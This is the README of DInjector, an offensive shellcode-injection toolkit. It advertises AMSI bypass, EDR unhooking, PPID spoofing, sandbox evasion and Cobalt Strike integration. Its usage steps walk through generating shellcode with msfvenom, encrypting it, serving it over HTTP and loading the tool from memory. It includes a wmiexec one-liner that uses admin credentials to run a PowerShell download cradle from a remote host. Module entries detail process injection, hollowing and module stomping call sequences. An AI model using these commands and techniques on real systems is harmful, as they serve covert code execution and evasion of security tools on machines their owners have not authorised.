DInjector
==========

```
     (    (
     )\ ) )\ )                   )             (   (  (
    (()/((()/(     (    (     ( /(    (        )\ ))\ )\
     /(_))/(_))(   )\  ))\ (  )\())(  )(      (()/((_|(_)
    (_))_(_))  )\ |(_)/((_))\(_))/ )\(()\      ((_))  _
     |   \_ _|_(_/( !(_)) ((_) |_ ((_)((_)     _| | || |
     | |) | || ' \)) / -_) _||  _/ _ \ '_|  _/ _` | || |
     |___/___|_||_|/ \___\__| \__\___/_|   (_)__,_|_||_|
                 |__/-----------------------------------
                                                K E E P
                                                C A L M
                                                  A N D
                                       D / I N 💉 E C T
                                      S H E L L C O D E
```

---

This repository is an accumulation of code snippets for various **shellcode injection** techniques using fantastic [D/Invoke](https://thewover.github.io/Dynamic-Invoke/) API by @TheWover and @FuzzySecurity.

Features:

* Fully ported to D/Invoke API
* Encrypted payloads which can be invoked from a URL or passed in base64 as an argument
* Built-in AMSI bypass
* [PPID Spoofing](https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing) and [block non-Microsoft DLLs](https://www.ired.team/offensive-security/defense-evasion/preventing-3rd-party-dlls-from-injecting-into-your-processes) (stolen from [TikiTorch](https://github.com/rasta-mouse/TikiTorch), write-up is [here](https://offensivedefence.co.uk/posts/ppidspoof-blockdlls-dinvoke/))
* Simple sandbox detection & evasion
* Prime numbers calculation to emulate sleep for in-memory scan evasion
* Ntdll.dll unhooking
* Cobalt Strike Integration

:information_source: Based on my testings the DInvoke NuGet [package](https://www.nuget.org/packages/DInvoke/) itself is being flagged by many commercial AV/EDR solutions when incuded as an embedded resource via [Costura.Fody](https://www.nuget.org/packages/Costura.Fody/) (or similar approaches), so I've [shrinked](https://github.com/snovvcrash/DInvoke/tree/dinjector) it a bit and included from [source](https://github.com/TheWover/DInvoke) to achieve better OpSec.

> **DISCLAIMER.** All information contained in this repository is provided for educational and research purposes only. The author is not responsible for any illegal use of this tool.

## Usage

1. Compile the project in VS (or via [OffensivePipeline](https://github.com/snovvcrash/OffensivePipeline/releases/tag/v0.8.2)).
2. Generate a shellcode of your choice:

```console
~$ msfvenom -p windows/x64/messagebox TITLE='MSF' TEXT='Hack the Planet!' EXITFUNC=thread -f raw -o shellcode.bin
```

3. [Encrypt](encrypt.py) the shellcode:

```console
~$ encrypt.py shellcode.bin -p 'Passw0rd!' -o enc
```

4. Serve the encrypted shellcode:

```console
~$ sudo python3 -m http.server 80
```

5. Use the PowerShell download [cradle](/cradle.ps1) to load DInjector.dll as `System.Reflection.Assembly` and execute it from memory.

:warning: I **do not** recommend putting the assembly on disk because it will very likely be flagged.

Global arguments:

| Name        | Required | Example Values           | Description                                                        |
|-------------|----------|--------------------------|--------------------------------------------------------------------|
| `/sc`       | ✔️        | `http://10.10.13.37/enc` | Sets shellcode path (can be loaded from URL or as a base64 string) |
| `/password` | ✔️        | `Passw0rd!`              | Sets password to decrypt the shellcode                             |
| `/sleep`    | ❌        | `10`, `25`               | Sets number of seconds (approx.) to sleep before execution         |
| `/am51`     | ❌        | `True`, `False`          | Applies AMSI bypass                                                |
| `/unhook`   | ❌        | `True`, `False`          | Unhooks ntdll.dll                                                  |

## Cobalt Strike Integration

In order to use DInjector from Cobalt Strike compile the project as a console application and put the assembly next to the Aggressor script.

![cs](https://user-images.githubusercontent.com/23141800/158037009-2e9eaa9c-08ff-48ed-9f84-86b7345974d3.png)

## Modules

:warning: OpSec safe considerations are based on my personal usage expirience and some testings along the way.

### [FunctionPointer](/DInjector/Modules/FunctionPointer.cs)

```yaml
module_name: 'functionpointer'
arguments:
description: |
  Allocates a RW memory region, copies the shellcode into it and executes it like a function.
calls:
  - ntdll.dll:
    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    2: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
opsec_safe: false
references:
  - 'http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/'
  - 'https://www.ired.team/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis'
  - 'https://www.fergonez.net/post/shellcode-csharp'
```

:information_source: When loading the cradle from a semi-interactive shell, use `Invoke-WmiMethod` to spawn a new PowerShell process. Example with [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py):

```bash
~$ wmiexec.py -silentcommand -nooutput administrator:'Passw0rd!'@192.168.1.11 "powershell -enc $(echo -n 'Invoke-WmiMethod Win32_Process -Name Create -ArgumentList ("powershell -enc '`echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/cradle.ps1")' | iconv -t UTF-16LE | base64 -w0`'")' | iconv -t UTF-16LE | base64 -w0)"
```

### [FunctionPointerV2](/DInjector/Modules/FunctionPointerV2.cs)

```yaml
module_name: 'functionpointerv2'
arguments:
description: |
  Sets RX on a byte array and executes it like a function.
calls:
  - ntdll.dll:
    1: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
opsec_safe: false
references:
  - 'https://jhalon.github.io/utilizing-syscalls-in-csharp-1/'
  - 'https://jhalon.github.io/utilizing-syscalls-in-csharp-2/'
  - 'https://github.com/jhalon/SharpCall/blob/master/Syscalls.cs'
```

### [ClipboardPointer](/DInjector/Modules/ClipboardPointer.cs)

```yaml
module_name: 'clipboardpointer'
arguments:
description: |
  Copies shellcode bytes into the clipboard, sets RX on it and executes it like a function.
calls:
  - user32.dll:
    1: 'OpenClipboard'
    2: 'SetClipboardData'
    3: 'CloseClipboard'
  - ntdll.dll:
    1: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
opsec_safe: true
references:
  - 'https://gist.github.com/Wra7h/69a03c802ae6977e74b1152a4b004515'
```

### [CurrentThread](/DInjector/Modules/CurrentThread.cs)

```yaml
module_name: 'currentthread'
arguments:
description: |
  Injects shellcode into current process.
  Thread execution via NtCreateThreadEx.
calls:
  - ntdll.dll:
    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    2: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    3: 'NtCreateThreadEx'
    4: 'NtWaitForSingleObject'
opsec_safe: false
references:
  - 'https://github.com/XingYun-Cloud/D-Invoke-syscall/blob/main/Program.cs'
```

### [CurrentThreadUuid](/DInjector/Modules/CurrentThreadUuid.cs) (FOR SMALL-[SIZE](https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate) PAYLOADS)

```yaml
module_name: 'currentthreaduuid'
arguments:
description: |
  Injects shellcode into current process.
  Thread execution via EnumSystemLocalesA.
calls:
  - kernel32.dll:
    1: 'HeapCreate'
    2: 'EnumSystemLocalesA'
  - rpcrt4.dll:
    1: 'UuidFromStringA'
opsec_safe: false
references:
  - 'https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/'
  - 'https://github.com/ChoiSG/UuidShellcodeExec/blob/main/USEConsole/Program.cs'
```

### [RemoteThread](/DInjector/Modules/RemoteThread.cs)

```yaml
module_name: 'remotethread'
arguments: |
  /pid:1337
description: |
  Injects shellcode into an existing remote process.
  Thread execution via NtCreateThreadEx.
calls:
  - ntdll.dll:
    1: 'NtOpenProcess'
    2: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    3: 'NtWriteVirtualMemory (shellcode)'
    4: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    5: 'NtCreateThreadEx'
opsec_safe: false
references:
  - 'https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/SharpImpersonation/Shellcode.cs'
```

### [RemoteThreadDll](/DInjector/Modules/RemoteThreadDll.cs)

```yaml
module_name: 'remotethreaddll'
arguments: |
  /pid:1337
  /dll:msvcp_win.dll
description: |
  Injects shellcode into an existing remote process overwriting one of its loaded modules' .text section.
  Thread execution via NtCreateThreadEx.
calls:
  - ntdll.dll:
    1: 'NtOpenProcess'
    2: 'NtWriteVirtualMemory (shellcode)'
    3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    4: 'NtCreateThreadEx'
opsec_safe:
references:
  - 'https://www.netero1010-securitylab.com/eavsion/alternative-process-injection'
```

### [RemoteThreadView](/DInjector/Modules/RemoteThreadView.cs)

```yaml
module_name: 'remotethreadview'
arguments: |
  /pid:1337
description: |
  Injects shellcode into an existing remote process.
  Thread execution via RtlCreateUserThread.
calls:
  - ntdll.dll:
    1: 'NtOpenProcess'
    2: 'NtCreateSection (PAGE_EXECUTE_READWRITE)'
    3: 'NtMapViewOfSection (PAGE_READWRITE)'
    4: 'NtMapViewOfSection (PAGE_EXECUTE_READ)'
    5: 'RtlCreateUserThread'
    6: 'NtUnmapViewOfSection'
opsec_safe: false
references:
  - 'https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Sections%20Shellcode%20Process%20Injector/Program.cs'
```

### [RemoteThreadSuspended](/DInjector/Modules/RemoteThreadSuspended.cs)

```yaml
module_name: 'remotethreadsuspended'
arguments: |
  /pid:1337
description: |
  Injects shellcode into an existing remote process and flips memory protection to PAGE_NOACCESS.
  After a short sleep (waiting until a possible AV scan is finished) the protection is flipped again to PAGE_EXECUTE_READ.
  Thread execution via NtCreateThreadEx.
calls:
  - ntdll.dll:
    1: 'NtOpenProcess'
    2: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    3: 'NtWriteVirtualMemory (shellcode)'
    4: 'NtProtectVirtualMemory (PAGE_NOACCESS)'
    5: 'NtCreateThreadEx (CREATE_SUSPENDED)'
    6: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    7: 'NtResumeThread'
opsec_safe: true
references:
  - 'https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/'
  - 'https://github.com/plackyhacker/Suspended-Thread-Injection/blob/main/injection.cs'
```

### [RemoteThreadKernelCB](/DInjector/Modules/RemoteThreadKernelCB.cs) (UNSTABLE)

```yaml
module_name: 'remotethreadkernelcb'
arguments: |
  /pid:1337
description: |
  Injects shellcode into an existing remote GUI process by spoofing the fnCOPYDATA value in KernelCallbackTable.
  Thread execution via SendMessageA.
calls:
  - user32.dll:
     1: 'FindWindowExA'
     2: 'SendMessageA'
  - ntdll.dll:
     1: 'NtOpenProcess'
     2: 'NtQueryInformationProcess'
     3: 'NtReadVirtualMemory (kernelCallbackAddress)'
     4: 'NtReadVirtualMemory (kernelCallbackValue)'
     5: 'NtReadVirtualMemory (kernelStruct.fnCOPYDATA)'
     6: 'NtProtectVirtualMemory (PAGE_READWRITE)'
     7: 'NtWriteVirtualMemory (shellcode)'
     8: 'NtProtectVirtualMemory (oldProtect)'
     9: 'NtProtectVirtualMemory (PAGE_READWRITE)'
    10: 'NtWriteVirtualMemory (origData)'
    11: 'NtProtectVirtualMemory (oldProtect)'
opsec_safe:
references:
  - 'https://t0rchwo0d.github.io/windows/Windows-Process-Injection-Technique-KernelCallbackTable/'
  - 'https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/'
  - 'https://gist.github.com/sbasu7241/5dd8c278762c6305b4b2009d44d60c13'
```

### [RemoteThreadAPC](/DInjector/Modules/RemoteThreadAPC.cs)

```yaml
module_name: 'remotethreadapc'
arguments: |
  /image:C:\Windows\System32\svchost.exe
  /ppid:31337
  /blockDlls:True
description: |
  Injects shellcode into a newly spawned remote process.
  Thread execution via NtQueueApcThread.
calls:
  - kernel32.dll:
    1: 'InitializeProcThreadAttributeList'
    2: 'UpdateProcThreadAttribute (blockDLLs)'
    3: 'UpdateProcThreadAttribute (PPID)'
    4: 'CreateProcessA'
  - ntdll.dll:
    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    2: 'NtWriteVirtualMemory (shellcode)'
    3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    4: 'NtOpenThread'
    5: 'NtQueueApcThread'
    6: 'NtAlertResumeThread'
opsec_safe: true
references:
  - 'https://rastamouse.me/exploring-process-injection-opsec-part-2/'
  - 'https://gist.github.com/jfmaes/944991c40fb34625cf72fd33df1682c0'
```

### [RemoteThreadContext](/DInjector/Modules/RemoteThreadAPC.cs)

```yaml
module_name: 'remotethreadcontext'
arguments: |
  /image:C:\Windows\System32\svchost.exe
  /ppid:31337
  /blockDlls:True
description: |
  Injects shellcode into a newly spawned remote process.
  Thread execution via SetThreadContext.
calls:
  - kernel32.dll:
    1: 'InitializeProcThreadAttributeList'
    2: 'UpdateProcThreadAttribute (blockDLLs)'
    3: 'UpdateProcThreadAttribute (PPID)'
    4: 'CreateProcessA'
  - ntdll.dll:
    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    2: 'NtWriteVirtualMemory (shellcode)'
    3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    4: 'NtCreateThreadEx (CREATE_SUSPENDED)'
    5: 'GetThreadContext'
    6: 'SetThreadContext'
    7: 'NtResumeThread'
opsec_safe: true
references:
  - 'https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/'
  - 'https://github.com/djhohnstein/CSharpSetThreadContext/blob/master/Runner/Program.cs'
```

### [ProcessHollowing](/DInjector/Modules/ProcessHollowing.cs)

```yaml
module_name: 'processhollowing'
arguments: |
  /image:C:\Windows\System32\svchost.exe
  /ppid:31337
  /blockDlls:True
description: |
  Injects shellcode into a newly spawned remote process.
  Thread execution via NtResumeThread (hollowing with shellcode).
calls:
  - kernel32.dll:
    1: 'InitializeProcThreadAttributeList'
    2: 'UpdateProcThreadAttribute (blockDLLs)'
    3: 'UpdateProcThreadAttribute (PPID)'
    4: 'CreateProcessA'
  - ntdll.dll:
    1: 'NtQueryInformationProcess'
    2: 'NtReadVirtualMemory (ptrImageBaseAddress)'
    3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE)'
    4: 'NtWriteVirtualMemory (shellcode)'
    5: 'NtProtectVirtualMemory (oldProtect)'
    6: 'NtResumeThread'
opsec_safe: false
references:
  - 'https://github.com/CCob/SharpBlock/blob/master/Program.cs'
```

### [ModuleStomping](/DInjector/Modules/ModuleStomping.cs)

```yaml
module_name: 'modulestomping'
arguments: |
  /image:C:\Windows\System32\svchost.exe
  /stomp:xpsservices.dll
  /export:DllCanUnloadNow
  /ppid:31337
  /blockDlls:True
description: |
  Loads a trusted module from disk and overwrites one of its exported functions.
  Thread execution via NtCreateThreadEx.
calls:
  - kernel32.dll:
     1: 'InitializeProcThreadAttributeList'
     2: 'UpdateProcThreadAttribute (blockDLLs)'
     3: 'UpdateProcThreadAttribute (PPID)'
     4: 'CreateProcessA'
  - ntdll.dll:
     1: 'NtAllocateVirtualMemory (bModuleName, PAGE_READWRITE)'
     2: 'NtAllocateVirtualMemory (shim, PAGE_READWRITE)'
     3: 'NtWriteVirtualMemory (bModuleName)'
     4: 'NtWriteVirtualMemory (shim)'
     5: 'NtProtectVirtualMemory (shim, PAGE_EXECUTE_READ)'
     6: 'NtCreateThreadEx (shim)'
     7: 'NtWaitForSingleObject'
     8: 'NtFreeVirtualMemory (allocModule)'
     9: 'NtFreeVirtualMemory (allocShim)'
    10: 'NtProtectVirtualMemory (shellcode, PAGE_READWRITE)'
    11: 'NtWriteVirtualMemory (shellcode)'
    12: 'NtProtectVirtualMemory (shellcode, PAGE_EXECUTE_READ)'
    13: 'NtCreateThreadEx (shellcode)'
opsec_safe: true
references:
  - 'https://offensivedefence.co.uk/posts/module-stomping/'
  - 'https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Stomper.cs'
```

## Credits

* @TheWover and @FuzzySecurity for their awesome [DInvoke](https://github.com/TheWover/DInvoke) project.
* All those great researchers mentioned in the modules references above.
